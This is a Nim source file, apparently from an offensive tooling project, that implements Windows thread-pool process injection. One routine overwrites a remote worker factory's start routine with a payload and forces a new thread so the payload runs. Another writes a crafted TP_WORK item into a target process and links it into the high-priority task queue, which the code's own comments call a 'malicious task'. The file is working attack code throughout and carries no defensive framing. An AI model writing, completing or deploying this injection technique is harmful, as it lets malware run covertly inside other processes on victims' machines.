import std/[strutils]
import winim/lean

import nimpool 

proc injectViaWorkerFactoryStartRoutine*(tProcess, hWorkerFactory: HANDLE, pPayload: pointer, szPayload: int): bool =
  var 
    status: NTSTATUS
    workerFactoryInfo: WORKER_FACTORY_BASIC_INFORMATION
    dwOldProtect: DWORD
    threadMinimumCount: int
    
  # Get function pointers
  let pNtSetInformationWorkerFactory = cast[NtSetInformationWorkerFactory](
    GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtSetInformationWorkerFactory")
  )
  let pNtQueryInformationWorkerFactory = cast[NtQueryInformationWorkerFactory](
    GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationWorkerFactory")
  )
  if pNtQueryInformationWorkerFactory == nil or pNtSetInformationWorkerFactory == nil:
    echo "[!] Failed to get function pointers"
    return false

  # Get start routine of the worker factory
  status = pNtQueryInformationWorkerFactory(
    hWorkerFactory, workerFactoryBasicInformation, cast[PVOID](workerFactoryInfo.addr), 
    sizeof(WORKER_FACTORY_BASIC_INFORMATION).ULONG, nil
  )
  if status != ERROR_SUCCESS:
    NTAPI_ERR("NtQueryInformationWorkerFactory", status)
    return false

  # Change start routine to R/W 
  if VirtualProtectEx(tProcess, workerFactoryInfo.StartRoutine, szPayload, PAGE_READWRITE, dwOldProtect.addr) == 0:
    WIN32_ERR("VirtualProtectEx")
    return false
  # Write payload
  if WriteProcessMemory(tProcess, workerFactoryInfo.StartRoutine, pPayload, szPayload, NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false
  # Revert Protections
  if VirtualProtectEx(tProcess, workerFactoryInfo.StartRoutine, szPayload, dwOldProtect, dwOldProtect.addr) == 0:
    WIN32_ERR("VirtualProtectEx")
    return false

  # Increase minimum number of threads in the pool
  threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1
  status = pNtSetInformationWorkerFactory(hWorkerFactory, workerFactoryThreadMinimum, cast[PVOID](threadMinimumCount.addr), sizeof(uint32).ULONG)
  if not NT_SUCCESS(status):
    NTAPI_ERR("NtSetInformationWorkerFactory", status)
    return false

  return true

proc injectViaTpWork*(tProcess: HANDLE, pAddress: pointer, hWorkerFactory: HANDLE): bool =
  var
    pFullTpPoolBuffer: PFULL_TP_POOL
    workerFactoryInfo: WORKER_FACTORY_BASIC_INFORMATION
    bytesRead: SIZE_T = 0
    taskQueueHighPriorityList: PLIST_ENTRY
    pFullTpWork: PFULL_TP_WORK
    pRemoteFullTpWork: PFULL_TP_WORK
    pRemoteWorkItemTaskNode: PLIST_ENTRY
    status: NTSTATUS
    bResult: bool

  # Get function pointer
  let pNtQueryInformationWorkerFactory = cast[NtQueryInformationWorkerFactory](
    GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationWorkerFactory")
  )
  if pNtQueryInformationWorkerFactory == nil:
    echo "[!] Failed to get function pointers"
    return false

  # Create FULL_TP_WORK callback structure
  pFullTpWork = cast[PFULL_TP_WORK](CreateThreadpoolWork(
    cast[PTP_WORK_CALLBACK](pAddress), NULL, NULL
  ))
  if pFullTpWork == nil:
    WIN32_ERR("CreateThreadPoolWork")
    return false

  # Query worker factory for StartRoutine value (head of linked list work queue)
  status = pNtQueryInformationWorkerFactory(
    hWorkerFactory, workerFactoryBasicInformation, cast[PVOID](workerFactoryInfo.addr), 
    sizeof(WORKER_FACTORY_BASIC_INFORMATION).ULONG, nil
  )
  if status != ERROR_SUCCESS:
    NTAPI_ERR("NtQueryInformationWorkerFactory", status)
    return false

  # Allocate heap buffer for TP_POOL structure and copy it
  pFullTpPoolBuffer = cast[PFULL_TP_POOL](HeapAlloc(
    GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FULL_TP_POOL)
  ))
  if pFullTpPoolBuffer == nil:
    WIN32_ERR("HeapAlloc")
    goto endOfInjectViaTpWork

  if ReadProcessMemory(tProcess, workerFactoryInfo.StartParameter, pFullTpPoolBuffer, sizeof(FULL_TP_POOL), bytesRead.addr) == 0:
    WIN32_ERR("ReadProcessMemory")
    goto endOfInjectViaTpWork

  # Associate the callback with the process' TP_POOL
  taskQueueHighPriorityList = (pFullTpPoolBuffer.TaskQueue[TP_CALLBACK_PRIORITY_HIGH].Queue).addr

  pFullTpWork.CleanupGroupMember.Pool = cast[PFULL_TP_POOL](workerFactoryInfo.StartParameter)
  pFullTpWork.Task.ListEntry.Flink = taskQueueHighPriorityList
  pFullTpWork.Task.ListEntry.Blink = taskQueueHighPriorityList
  pFullTpWork.WorkState.Union_1.Exchange = 2

  # Write the callback structure into the process
  pRemoteFullTpWork = cast[PFULL_TP_WORK](VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_WORK), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
  if pRemoteFullTpWork == nil:
    WIN32_ERR("VirtualAllocEx")
    goto endOfInjectViaTpWork

  if WriteProcessMemory(tProcess, pRemoteFullTpWork, pFullTpWork, sizeof(FULL_TP_WORK), nil) == 0:
    WIN32_ERR("WriteProcessMemory [1]")
    goto endOfInjectViaTpWork

  # Modify the TP_POOL linked list Flinks and Blinks to point to malicious task
  pRemoteWorkItemTaskNode = (pRemoteFullTpWork.Task.ListEntry).addr

  if WriteProcessMemory(
    tProcess, (pFullTpPoolBuffer.TaskQueue[TP_CALLBACK_PRIORITY_HIGH].Queue.Flink).addr,
    pRemoteWorkItemTaskNode.addr, sizeof(pRemoteWorkItemTaskNode), NULL
  ) == 0:
    WIN32_ERR("WriteProcessMemory [2]")
    goto endOfInjectViaTpWork

  if WriteProcessMemory(
    tProcess, (pFullTpPoolBuffer.TaskQueue[TP_CALLBACK_PRIORITY_HIGH].Queue.Blink).addr,
    pRemoteWorkItemTaskNode.addr, sizeof(pRemoteWorkItemTaskNode), NULL
  ) == 0:
    WIN32_ERR("WriteProcessMemory [3]")
    goto endOfInjectViaTpWork

  bResult = true

  label endOfInjectViaTpWork:
    if pFullTpPoolBuffer != nil:
      HeapFree(GetProcessHeap(), 0, pFullTpPoolBuffer)
    return bResult